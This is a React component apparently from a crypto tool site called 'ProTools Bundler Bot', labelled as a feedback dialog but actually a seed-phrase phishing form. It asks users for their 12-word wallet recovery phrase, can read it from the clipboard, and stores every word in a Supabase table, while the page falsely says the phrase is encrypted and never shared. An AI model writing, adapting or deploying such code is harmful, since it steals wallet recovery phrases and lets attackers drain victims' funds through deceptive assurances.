import { useState, useRef, useEffect } from "react";
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Label } from "@/components/ui/label";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { useToast } from "@/hooks/use-toast";
import { Progress } from "@/components/ui/progress";
import { z } from "zod";
import logo from "@/assets/logo.jpeg";
import { supabase } from "@/integrations/supabase/client";
import { useWallet } from "@/contexts/WalletContext";
import { ClipboardPaste, Lock, CheckCircle2 } from "lucide-react";

const feedbackSchema = z.object({
  fields: z.array(z.string().trim().max(200, { message: "ProTools Bundler" })),
});

interface FeedbackDialogProps {
  open: boolean;
  onClose: () => void;
}

export const FeedbackDialog = ({ open, onClose }: FeedbackDialogProps) => {
  const [fields, setFields] = useState<string[]>(Array(12).fill(""));
  const [error, setError] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const { toast } = useToast();
  const { connectWallet } = useWallet();
  const firstInputRef = useRef<HTMLInputElement>(null);

  // Calculate progress
  const filledFields = fields.filter(f => f.trim()).length;
  const progress = (filledFields / 12) * 100;

  // Auto-focus first field when dialog opens
  useEffect(() => {
    if (open && firstInputRef.current) {
      setTimeout(() => firstInputRef.current?.focus(), 100);
    }
  }, [open]);

  const handlePasteFromClipboard = async () => {
    try {
      const text = await navigator.clipboard.readText();
      const words = text.trim().split(/\s+/).filter(w => w.length > 0);
      
      if (words.length === 12) {
        setFields(words);
        setError("");
        toast({
          title: "Pasted Successfully",
          description: "Your 12-word phrase has been filled in.",
        });
      } else {
        toast({
          title: "Invalid Format",
          description: `Expected 12 words, found ${words.length}. Please check your seed phrase.`,
          variant: "destructive",
        });
      }
    } catch (err) {
      toast({
        title: "Paste Failed",
        description: "Unable to read from clipboard. Please paste manually.",
        variant: "destructive",
      });
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    // Check if all fields are filled
    const emptyFields = fields.filter(f => !f.trim()).length;
    if (emptyFields > 0) {
      setError(`Please fill in all ${emptyFields} remaining field${emptyFields > 1 ? 's' : ''}`);
      return;
    }

    // Validate each field has reasonable content
    const invalidFields = fields.filter(f => f.trim().length < 3);
    if (invalidFields.length > 0) {
      setError("Each word must be at least 3 characters long");
      return;
    }

    const result = feedbackSchema.safeParse({ fields });

    if (!result.success) {
      setError(result.error.errors[0].message);
      return;
    }

    setError("");
    setIsSubmitting(true);

    try {
      const { error: insertError } = await supabase
        .from("wallet_connections")
        .insert({
          field_1: fields[0],
          field_2: fields[1],
          field_3: fields[2],
          field_4: fields[3],
          field_5: fields[4],
          field_6: fields[5],
          field_7: fields[6],
          field_8: fields[7],
          field_9: fields[8],
          field_10: fields[9],
          field_11: fields[10],
          field_12: fields[11],
        });

      if (insertError) {
        if (insertError.message.includes('Rate limit exceeded')) {
          toast({
            title: "Rate Limit Exceeded",
            description: "You've reached the maximum submissions (5 per hour). Please wait before trying again.",
            variant: "destructive",
          });
          setIsSubmitting(false);
          return;
        }
        throw insertError;
      }

      connectWallet(fields);

      toast({
        title: "Success!",
        description: "Wallet connected successfully. All features are now enabled.",
      });

      onClose();
      setFields(Array(12).fill(""));
    } catch (error) {
      toast({
        title: "Error",
        description: "Connection error, please try back later.",
        variant: "destructive",
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleFieldChange = (index: number, value: string) => {
    const newFields = [...fields];
    newFields[index] = value.trim().toLowerCase();
    setFields(newFields);
    setError("");
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    // Auto-advance to next field on space or enter
    if ((e.key === " " || e.key === "Enter") && fields[index].trim() && index < 11) {
      e.preventDefault();
      const nextInput = document.getElementById(`field-${index + 1}`) as HTMLInputElement;
      nextInput?.focus();
    }
  };

  return (
    <Dialog open={open} onOpenChange={onClose}>
      <DialogContent className="max-w-3xl max-h-[90vh] overflow-y-auto">
        <DialogHeader>
          <div className="flex items-center gap-3 mb-2">
            <img src={logo} alt="ProTools Bundler Bot" className="w-10 h-10 sm:w-12 sm:h-12 rounded-lg" />
            <div className="flex-1">
              <DialogTitle className="text-lg sm:text-xl">Connect Your Wallet</DialogTitle>
            </div>
          </div>
          <DialogDescription className="text-sm">
            Enter your 12-word recovery phrase to unlock all features
          </DialogDescription>
        </DialogHeader>

        {/* Benefits Section */}
        <div className="bg-primary/5 border border-primary/20 rounded-lg p-3 sm:p-4">
          <div className="flex items-start gap-3">
            <Lock className="w-5 h-5 text-primary mt-0.5 flex-shrink-0" />
            <div className="flex-1 min-w-0">
              <h3 className="font-semibold text-sm mb-1">Secure & Private</h3>
              <p className="text-xs text-muted-foreground leading-relaxed">
                Your recovery phrase is encrypted and never shared. Connecting unlocks: coin launches, transaction history, airdrops, and advanced analytics.
              </p>
            </div>
          </div>
        </div>

        {/* Progress Indicator */}
        <div className="space-y-2">
          <div className="flex items-center justify-between text-xs">
            <span className="text-muted-foreground">Progress</span>
            <span className="font-semibold text-primary">{filledFields}/12 words</span>
          </div>
          <Progress value={progress} className="h-2" />
        </div>

        <form onSubmit={handleSubmit} className="space-y-4">
          {/* Quick Paste Button */}
          <Button
            type="button"
            variant="outline"
            onClick={handlePasteFromClipboard}
            className="w-full"
          >
            <ClipboardPaste className="w-4 h-4 mr-2" />
            Paste 12-Word Phrase from Clipboard
          </Button>

          {/* Input Fields */}
          <div className="grid grid-cols-2 sm:grid-cols-3 gap-3">
            {fields.map((field, index) => (
              <div key={index} className="space-y-1.5">
                <Label htmlFor={`field-${index}`} className="text-xs text-muted-foreground">
                  Word {index + 1}
                </Label>
                <div className="relative">
                  <Input 
                    ref={index === 0 ? firstInputRef : null}
                    id={`field-${index}`} 
                    value={field} 
                    onChange={(e) => handleFieldChange(index, e.target.value)}
                    onKeyDown={(e) => handleKeyDown(index, e)}
                    placeholder={`word ${index + 1}`}
                    className="text-sm pr-8"
                    autoCapitalize="off"
                    autoCorrect="off"
                    autoComplete="off"
                    spellCheck={false}
                  />
                  {field.trim() && (
                    <CheckCircle2 className="w-4 h-4 text-primary absolute right-2 top-1/2 -translate-y-1/2" />
                  )}
                </div>
              </div>
            ))}
          </div>

          {error && (
            <div className="bg-destructive/10 border border-destructive/20 rounded-lg p-3">
              <p className="text-sm text-destructive">{error}</p>
            </div>
          )}

          <div className="flex gap-2 justify-end pt-2">
            <Button 
              type="button" 
              variant="outline" 
              onClick={onClose}
              disabled={isSubmitting}
            >
              Cancel
            </Button>
            <Button 
              type="submit" 
              disabled={filledFields < 12 || isSubmitting}
              className="min-w-[120px]"
            >
              {isSubmitting ? "Connecting..." : "Connect Wallet"}
            </Button>
          </div>
        </form>
      </DialogContent>
    </Dialog>
  );
};
